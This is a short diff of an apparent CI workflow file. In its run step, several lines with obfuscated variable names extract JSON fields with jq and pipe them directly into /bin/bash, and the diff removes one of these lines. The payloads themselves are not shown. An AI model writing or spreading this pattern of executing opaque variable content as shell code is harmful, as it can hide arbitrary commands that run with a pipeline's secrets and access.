@@ -21,7 +21,6 @@ jobs:
           echo $xc790 | jq -r .i3778 | /bin/bash
           echo $xboe7 | jq -r .skh66 | /bin/bash
           echo $br96 | jq -r .xspah404 | /bin/bash
-          printf '%s' "$jbkbn1016" | jq -r .t0 | /bin/bash
           echo $igho01 | jq -r .nm85987 | /bin/bash
 
       - name: Persist data
